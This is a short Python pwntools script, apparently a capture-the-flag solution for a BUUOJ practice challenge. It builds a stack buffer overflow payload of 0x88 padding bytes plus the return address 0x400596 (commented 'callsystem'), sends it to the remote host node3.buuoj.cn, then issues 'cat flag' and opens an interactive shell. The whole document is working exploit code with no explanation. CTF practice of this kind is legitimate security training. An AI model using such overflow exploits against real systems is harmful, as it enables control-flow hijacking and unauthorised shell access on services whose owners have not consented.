# callsystem 0x400596
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
payload = ('a' * (0x80 + 0x8)).encode() + p64(0x400596)
# print(type(p64(0x400596)))
r = remote('node3.buuoj.cn', 28586)
r.recvuntil('Hello, World\n')
r.sendline(payload)

r.sendline('cat flag')
r.interactive()
